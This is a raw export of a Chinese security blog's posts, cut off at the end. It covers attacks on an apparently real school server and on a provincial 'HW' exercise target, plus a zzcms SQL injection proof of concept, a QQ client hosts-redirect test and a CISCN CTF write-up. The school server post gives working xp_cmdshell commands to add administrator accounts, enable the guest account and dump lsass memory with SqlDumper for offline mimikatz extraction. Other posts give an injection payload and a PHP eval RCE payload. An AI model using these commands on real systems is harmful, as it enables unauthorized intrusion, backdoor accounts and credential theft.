2019&#x2F;8&#x2F;30, 8:37:41</span><br><span class="line">系统制造商:       Inspur</span><br><span class="line">系统型号:         NF5270M4</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 2 个处理器。</span><br><span class="line">                  [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~1197 Mhz</span><br><span class="line">                  [02]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~1197 Mhz</span><br><span class="line">BIOS 版本:        American Megatrends Inc. 4.1.10, 2016&#x2F;6&#x2F;1</span><br><span class="line">Windows 目录:     C:\Windows</span><br><span class="line">系统目录:         C:\Windows\system32</span><br><span class="line">启动设备:         \Device\HarddiskVolume1</span><br><span class="line">系统区域设置:     zh-cn;中文(中国)</span><br><span class="line">输入法区域设置:   zh-cn;中文(中国)</span><br><span class="line">时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="line">物理内存总量:     32,648 MB</span><br><span class="line">可用的物理内存:   28,163 MB</span><br><span class="line">虚拟内存: 最大值: 65,294 MB</span><br><span class="line">虚拟内存: 可用:   60,327 MB</span><br><span class="line">虚拟内存: 使用中: 4,967 MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               WORKGROUP</span><br><span class="line">登录服务器:       暂缺</span><br><span class="line">修补程序:         安装了 2 个修补程序。</span><br><span class="line">                  [01]: KB4012212</span><br><span class="line">                  [02]: KB976902</span><br><span class="line">网卡:             安装了 2 个 NIC。</span><br><span class="line">                  [01]: Intel(R) I350 Gigabit Network Connection</span><br><span class="line">                      连接名:      本地连接</span><br><span class="line">                      启用 DHCP:   否</span><br><span class="line">                      IP 地址</span><br><span class="line">                        [01]: 192.168.122.16</span><br><span class="line">                        [02]: fe80::e436:8d88:315b:25aa</span><br><span class="line">                  [02]: Intel(R) I350 Gigabit Network Connection</span><br><span class="line">                      连接名:      本地连接 2</span><br><span class="line">                      状态:        媒体连接已中断</span><br></pre></td></tr></table></figure><p><code>exec master..xp_cmdshell &quot;ipconfig&quot;</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以太网适配器 本地连接 2:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line"></span><br><span class="line">以太网适配器 本地连接:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::e436:8d88:315b:25aa%11</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 192.168.122.16</span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . : 192.168.122.254</span><br><span class="line"></span><br><span class="line">隧道适配器 isatap.&#123;9520CC43-69D2-42A5-99EB-2A1A49B84B34&#125;:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : </span><br><span class="line"></span><br><span class="line">隧道适配器 Teredo Tunneling Pseudo-Interface:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开</span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . :</span><br></pre></td></tr></table></figure><h1 id="提权路"><a href="#提权路" class="headerlink" title="提权路"></a>提权路</h1><p><code>exec master..xp_cmdshell &quot;whoami&quot;</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568596816710.png" alt="1568596816710"></p><p>既然是system，直接<code>net user asp.net 123456/add &amp;&amp; net localgroup administrators asp.net /add</code>一波带走</p><p>远程连上看看</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568553378635.png" alt="1568553378635"></p><p>WTF??? 还有个360……</p><p>那么接下来肯定登不上。。</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568553429934.png" alt="1568553429934"></p><h2 id="换个思路"><a href="#换个思路" class="headerlink" title="换个思路"></a>换个思路</h2><p>接下来开始翻资料，梳理下现在的情况</p><blockquote><ol><li>MSSQL数据库SA权限</li><li>有360</li><li>数据库以system权限启动的</li></ol></blockquote><p>翻资料的时候看到了这个</p><p><a href="https://zhuanlan.zhihu.com/p/57800688" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/57800688</a></p><blockquote><p>SqlDumper.exe是从SQL Server安装目录下提取出来的，<strong>功能和Procdump相似，</strong>并且也是微软出品的，体积远小于Procdump，也具备一定的免杀功能。SqlDumper.exe默认存放在C:\Program Files\Microsoft SQL Server\number\Shared，number代表SQL Server的版本，<strong>参考如下：</strong></p><p>140 for SQL Server 2017</p><p>130 for SQL Server 2016</p><p>120 for SQL Server 2014</p><p>110 for SQL Server 2012</p><p>100 for SQL Server 2008</p><p>90 for SQL Server 2005</p><p>如果目标机器没有安装SQL Server，可以自己上传一个SqlDumper.exe。</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="/images/1568553515104.png" alt="1568553515104"></p><p>那么查下数据库版本信息</p><p><code>Select @@version</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568596841958.png" alt="1568596841958"></p><p>那么命令应该是<code>C:\Program Files\Microsoft SQL Server\100\Shared\Sqldumper.exe ProcessID 0 0x01100</code></p><p>继续查下<code>lsass</code>的<code>pid</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568596860129.png" alt="1568596860129"></p><p>命令补全后<code>&quot;C:\Program Files\Microsoft SQL Server\100\Shared\Sqldumper.exe&quot; 608 0 0x01100 0 C:\Users\Administrator\AppData\Local\Temp</code></p><p>其中，<code>Sqldumper</code>原型为<code>SqlDumper &lt;process id (PID)&gt; &lt;thread id (TID)&gt; &lt;Flags:Minidump Flags&gt; &lt;SQLInfoPtr&gt; &lt;Dump Directory&gt;</code></p><p>然后执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DECLARE @line sysname</span><br><span class="line">SET @line &#x3D; &#39;&quot;C:\Program Files\Microsoft SQL Server\100\Shared\Sqldumper.exe&quot; 608 0 0x01100 0 C:\Users\Administrator\AppData\Local\Temp&#39;</span><br><span class="line">EXEC master..xp_cmdshell @line</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/1568596881884.png" alt="1568596881884"></p><p>然后就该读文件了，扫描端口时发现了iis7默认页面</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568555181184.png" alt="1568555181184"></p><p>由于已经dump了<code>lsass</code>的内存，那么思路转变为利用IIS7服务下载<code>SQLDmpr0001.mdmp</code>，本地<code>mimikatz</code>解密</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DECLARE @old sysname,@new sysname,@cmd sysname</span><br><span class="line">SET @old &#x3D; &#39;&quot;C:\Users\Administrator\AppData\Local\Temp\SQLDmpr0001.mdmp&quot;&#39;</span><br><span class="line">SET @new &#x3D; &#39;&quot;C:\inetpub\wwwroot\SQLDmpr0001.mdmp&quot;&#39;</span><br><span class="line">SET @cmd &#x3D; &#39;copy &#39;+@old+&#39; &#39;+@new</span><br><span class="line">EXEC master..xp_cmdshell @cmd</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/1568596901881.png" alt="1568596901881"></p><p>访问看看</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568556078651.png" alt="1568556078651"></p><p>诶？咋404了</p><p>换个文件名试试</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DECLARE @old sysname,@new sysname,@cmd sysname</span><br><span class="line">SET @old &#x3D; &#39;&quot;C:\Users\Administrator\AppData\Local\Temp\SQLDmpr0001.mdmp&quot;&#39;</span><br><span class="line">SET @new &#x3D; &#39;&quot;C:\inetpub\wwwroot\test.txt&quot;&#39;</span><br><span class="line">SET @cmd &#x3D; &#39;copy &#39;+@old+&#39; &#39;+@new</span><br><span class="line">EXEC master..xp_cmdshell @cmd</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/1568596920874.png" alt="1568596920874"></p><p>在访问，下载成功</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568556171247.png" alt="1568556171247"></p><p>然后扔<code>咪咪卡住（mimikatz）</code>一条命令梭哈<code>mimikatz.exe&quot;sekurlsa::minidumpSQLDmpr0001.mdmp&quot;&quot;sekurlsa::logonPasswords full&quot;&quot;exit&quot;</code></p><p>然而事情没那么简单。。</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568557302866.png" alt="1568557302866"></p><p>管理员自从上次登录（7月）后就再也没登录过……</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568596947893.png" alt="1568596947893"></p><p>一筹莫展时发现有个guest用户，尝试下另一个思路</p><p><code>EXEC master..xp_cmdshell &#39;net user guest /active:yes&#39;</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568596969749.png" alt="1568596969749"></p><p>加密码和管理组</p><p><code>EXEC master..xp_cmdshell &#39;net user guest 123456 &amp;&amp; net localgroup administrators guest /add&#39;</code></p><p>然而还是一样</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568553429934.png" alt="1568553429934"></p><h2 id="暴躁老哥在线重启"><a href="#暴躁老哥在线重启" class="headerlink" title="暴躁老哥在线重启"></a>暴躁老哥在线重启</h2><p>由于是学校的服务器，而且教学楼时不时断电，于是乎~</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568596990547.png" alt="1568596990547"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568560316707.png" alt="1568560316707"></p><p>重启后尝试连接</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568560359816.png" alt="1568560359816"></p><p>久违的<code>Win2008</code> GET！</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某省HW中遇到的提权</title>
      <link href="/p/2108.html"/>
      <url>/p/2108.html</url>
      
        <content type="html"><![CDATA[<p>某省HW中遇到的一个环境提权笔记</p><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>环境：</p><blockquote><p>OS: Windows Server 2012 R2</p><p>补丁情况：</p><p>KB3139914 : MS16-032<br>KB3124280 : MS16-016<br>KB3134228 : MS16-014<br>KB3079904 : MS15-097<br>KB3077657 : MS15-077<br>KB3045171 : MS15-051<br>KB3000061 : MS14-058<br>KB2829361 : MS13-046<br>KB2850851 : MS13-053 EPATHOBJ 0day 限32位<br>KB2707511 : MS12-042 sysret -pid<br>KB2124261 : KB2271195 MS10-065 IIS7<br>KB970483 : MS09-020 IIS6</p><p>安全软件：360套装</p><p>Webshell: :white_check_mark:</p><p>内网</p></blockquote><p>既然有16-032，为了一次成功，本地搭个环境，<code>github</code>上面下载到的ms16-032果不其然被<code>Gank</code>了</p><p><img src= "/img/loading.gif" data-lazy-src="/images/9PS6_TFE213LN2%5BYQ$XRA%604.png" alt="img"></p><p>那么就需要做免杀了，然而自己做的免杀要么</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568387082157.png" alt="1568387082157"></p><p>要么</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568387071221.png" alt="1568387071221"></p><p>要么是编译好了跑不起来（vs2019编译的，SDK太高了？）</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568387110896.png" alt="1568387110896"></p><p>这时朋友扔了个思路过来</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568387139609.png" alt="1568387139609"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568387151036.png" alt="1568387151036"></p><p>然后我们进行操作</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568387171353.png" alt="1568387171353"></p><p>用webshell试试</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568387214830.png" alt="1568387214830"></p><p>添加成功了，接下来试着添加到管理组</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568387290774.png" alt="1568387290774"></p><p>猜到还是360在作怪</p><p>然后换了个思路，抓lsass内存</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568387339192.png" alt="1568387339192"></p><p>由于是2012，修复了lsass dump内存时会转储明文密码的漏洞，只能dump NTLM的hash，但是运气不错，是个弱口令，cmd5解出来直接登录</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568387380666.png" alt="1568387380666"></p><p>通过登录记录，拿下第二台</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1568387483766.png" alt="1568387483766"></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zzcms前台SQL注入</title>
      <link href="/p/9a55.html"/>
      <url>/p/9a55.html</url>
      
        <content type="html"><![CDATA[<p>存储型XSS参考文章<a href="https://0x20h.com/p/9812.html">https://0x20h.com/p/9812.html</a></p><a id="more"></a><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>还是<code>markit()</code>函数，既然没有对URI进行过滤直接写入数据库，那么能不能搞点事情呢？</p><p>先看看这个<code>query</code>函数怎么执行的</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563460628040.png" alt="1563460628040"></p><p>可以看到直接带入<code>mysqli_query</code>，那么尝试构造下<code>payload</code>吧</p><p>原始SQL语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> zzcms_bad (username,ip,dose,sendtime)</span><br><span class="line"><span class="keyword">values</span></span><br><span class="line">(<span class="string">'" . $_COOKIE["UserName"] . "'</span>,<span class="string">'$userip'</span>,<span class="string">'$url'</span>,<span class="string">'" . date('</span>Y-m-d H:i:s<span class="string">') . "'</span>)</span><br></pre></td></tr></table></figure><p>既然只有<code>$url</code>可控，那么直接构造传入的URI就可以了，先直接让数据库执行<code>sleep()</code>函数</p><p><code>insert into zzcms_bad (username,ip,dose,sendtime)values(&#39;test&#39;,&#39;127.0.0.1&#39;,&#39;http://www.zzcms2019.cc/user/ask.php?do=modify&amp;page=1&amp;id=1&amp;aaa=&#39;or sleep(5),&#39;&#39;);#</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563460855588.png" alt="1563460855588"></p><p>OK 成功，那么直接构造就行了</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;user&#x2F;ask.php?do&#x3D;modify&amp;page&#x3D;1&amp;id&#x3D;1&amp;aaa&#x3D;&#39;or sleep(5),&#39;&#39;);# HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure><p>结果发现并没有执行</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563460935987.png" alt="1563460935987"></p><p>在函数中dump下<code>$url</code>看看原因</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563460982085.png" alt="1563460982085"></p><p>发现被url中的空格截断了</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563461016341.png" alt="1563461016341"></p><p>那么直接用注释<code>/**/</code>替换</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563461049641.png" alt="1563461049641"></p><p>成功睡眠5秒，证明存在SQL注入。</p>]]></content>
      
      
      <categories>
          
          <category> CodeReview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeReview </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQ客户端一处BUG</title>
      <link href="/p/7f02.html"/>
      <url>/p/7f02.html</url>
      
        <content type="html"><![CDATA[<p>无意中发现的一处问题</p><a id="more"></a><h1 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h1><p>因为我电脑安装的<code>flash</code>不是国版的（不是那个某公司二次打包后的）直接安装的adobe官网的导致一些应用无法使用，比如QQ客户端的空间选项卡中的上传图片功能</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565602911257.png" alt=""></p><p>然后呢，点击时会跳转到<code>aodobe</code>官网</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565602974074.png" alt=""></p><p>验证猜想，QQ集成了几个web页面，那么如果把<code>aodobe</code>官网重定向呢？</p><p>先获取下访问的域名，这点可以用<code>wireshark</code>抓出来</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565603284361.png" alt=""></p><p>本地<code>hosts</code>再改下，再架个web服务器</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565603110063.png" alt=""></p><p>再写个<code>html</code>文件，放置于于<code>/www/go/getflashGeoError/</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565603618076.png" alt=""></p><p>HTML代码如下</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    alert(<span class="built_in">document</span>.cookie);<span class="comment">//弹cookie</span></span></span><br><span class="line"><span class="actionscript">    alert(navigator.userAgent);<span class="comment">//弹UA</span></span></span><br><span class="line"><span class="actionscript">    alert(<span class="string">"tx"</span>);<span class="comment">//弹tx</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>It works!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>好了，测试下</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565603761764.png" alt=""></p><p>第一个框是<code>Cookie</code>的，由于没有<code>Cookie</code>所以为空</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565603838353.png" alt=""></p><p>第二个框是UA，可以看到是<code>Chrome 43</code>的内核</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565603885724.png" alt=""></p><p>第三个框</p><p>然后显示页面</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565604764602.png" alt=""></p><p>此时的页面是无法使用右键的，改下JS代码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    alert(<span class="built_in">document</span>.cookie); <span class="comment">//弹cookie</span></span></span><br><span class="line"><span class="actionscript">    alert(navigator.userAgent); <span class="comment">//弹UA</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.onselectstart = <span class="built_in">document</span>.oncontextmenu = <span class="built_in">document</span>.onmousedown = <span class="built_in">document</span>.onkeydown = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    alert(<span class="string">"Cracked!"</span>); </span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>It works!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后依旧失效，推测是客户端屏蔽了相关设置并非内核屏蔽。。</p><p>最后上个跳转玩玩。。</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1565608923668.png" alt=""></p><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>如果一个内网中，DNS服务被更改，把奥多比域名和<code>Flash.cn</code>的域名指向了恶意服务器，结合最近爆出的<code>CVE-2019-5786</code>或者更早的漏洞（内核43+以上的漏洞），是否可以搞点事情？</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019年CISCN(全国大学生信息安全竞赛)华南赛区wp</title>
      <link href="/p/ece4.html"/>
      <url>/p/ece4.html</url>
      
        <content type="html"><![CDATA[<blockquote><ol><li>题目是在Fix It环境拷下来的，写<code>writeup</code>时的环境是自己搭的</li><li>有些题目忘记拷贝数据库，各位大佬凑活看吧</li><li>题目的GitHub仓库：<a href="https://github.com/NS-Sp4ce/2019-Ciscn-Southern-China-Web" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/2019-Ciscn-Southern-China-Web</a></li></ol></blockquote><a id="more"></a><h1 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h1><h2 id="Break-It"><a href="#Break-It" class="headerlink" title="Break It"></a>Break It</h2><p>打开页面如下</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1562850051215.png" alt="1562850051215"></p><p>按照惯例<code>Ctrl+U</code>看源代码，发现被注释的<code>&lt;!--  &lt;p class=&quot;forgot&quot;&gt;&lt;a id=&quot;iforget&quot; href=&quot;forgetpassword.php&quot;&gt;Forgot your password?&lt;/a&gt;&lt;/p&gt;--&gt;</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1562850150394.png" alt="1562850150394"></p><p>字面意思是重置密码的页面，访问试试</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1562850199817.png" alt="1562850199817"></p><p>由于不知道用户名，抓包随便输入个用户名看看返回的信息</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1562850323023.png" alt="1562850323023"></p><p>OK，找个用户名字典爆破下</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1562850802531.png" alt="1562850802531"></p><p>设置下</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1562850369376.png" alt="1562850369376"></p><p>爆破出<code>admin123</code>这个用户存在</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1562850867761.png" alt="1562850867761"></p><p>输入后，跳转到下一个页面</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1562850892755.png" alt="1562850892755"></p><p>4位验证码爆破走起</p><p>扔<code>Burpsuite</code>里</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1562850976886.png" alt="1562850976886"></p><p>设置</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1562850969198.png" alt="1562850969198"></p><p>走起，然后踩了第一个坑</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1562851061799.png" alt="1562851061799"></p><p>验证码全部错误，<code>Ctrl+U</code>看了下源代码</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1562851107127.png" alt="1562851107127"></p><p>哦豁，设置<code>base64</code>编码</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1562851144415.png" alt="1562851144415"></p><p>继续爆破，时间不长出现重置密码的信息</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1562851197988.png" alt="1562851197988"></p><p>用户名<code>admin123</code>，密码<code>f4h1l0t0j2g5b1m0a0m0a3d2d0</code>，登上去看看</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1562851268627.png" alt="1562851268627"></p><p>提示phpmyadmin，进去看看</p><p>打开后发现</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1562854196288.png" alt="1562854196288"></p><p>这时候比赛方放出hint，备份文件，然后，一顿扫</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1562854391609.png" alt="1562854391609"></p><p>扫出备份文件</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1562854426155.png" alt="1562854426155"></p><p>提示</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Why not try code breaking?</span><br><span class="line">&#x2F;&#x2F;mDjNaF.php</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/1562854458724.png" alt="1562854458724"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123; </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来的步骤在赛后参考了<code>2018RCTF</code>的原题<code>r-cursive</code>（<a href="https://delcoding.github.io/2018/05/rctf-web-writeup1/#r-cursive）" target="_blank" rel="noopener">https://delcoding.github.io/2018/05/rctf-web-writeup1/#r-cursive）</a></p><blockquote><p>根据正则匹配条件和本地搭环境调试可以知道只能执行不带参数、函数名不含包括_在内的特殊符号，所以只能是<code>x(y(z()))</code>此类的调用形式。所以从<code>code</code>参数里进行函数执行是不太可能的了，比赛时也没有想到突破方法，后来才得知可以运行<code>http header</code>头来进行处理。</p><p>PHP中可以使用<code>get_headers</code>,<code>getallheaders</code>获得HTTP请求头的信息，并返回键值数组，所以我们就只能用<code>getallheaders()</code>来获取。又因为返回的是数组，我们可以使用<code>implode()</code>来将数组转换成字符串。所以我们初步构造：<code>implode(getallheaders())</code>。但如果仅是这样还不能运行我们的代码，因为<code>implode()</code>返回的已经是字符串了，<code>&quot;implode()&quot;</code>（注意<code>&quot;</code>），有相当于多嵌套了一层字符，所以我们应该使用<code>eval(implode(getallheaders()));</code>来进行执行。</p></blockquote><p>然后又发现<code>cookie</code>中的<code>PHPSESSID</code>可控，<code>PHP</code>中<code>session_id()</code>函数可以获取 <code>PHPSESSID</code>，如果没有开启 <code>session</code>可以使用 <code>session_start()</code>函数。由于不能带参数，我们可以将命令转化为 hex 再用 <code>hex2bin()</code>函数转换，尝试构造请求包如下</p><blockquote><p>GET /mDjNaF.php?code=eval(hex2bin(session_id(session_start()))); HTTP/1.1<br>Cookie: PHPSESSID=6563686f2754455354273b<br>Host: 192.168.2.227:81<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36<br>DNT: 1<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8<br>Connection: close</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="/images/1562895846737.png" alt="1562895846737"></p><p>这样就可以构造RCE了</p><p>Payload:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;mDjNaF.php?code&#x3D;eval(hex2bin(session_id(session_start()))); HTTP&#x2F;1.1</span><br><span class="line">Cookie: PHPSESSID&#x3D;6563686f2066696c655f6765745f636f6e74656e747328222f666c616722293b</span><br></pre></td></tr></table></figure><p><code>6563686f2066696c655f6765745f636f6e74656e747328222f666c616722293b</code>Hex解码后为<code>echo file_get_contents(&quot;/flag&quot;);</code></p><h2 id="Fix-it"><a href="#Fix-it" class="headerlink" title="Fix it"></a>Fix it</h2><p>修改<code>mDjNaF.php</code>文件，注释掉<code>eval</code>函数。</p><h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><h2 id="Break-it"><a href="#Break-it" class="headerlink" title="Break it"></a>Break 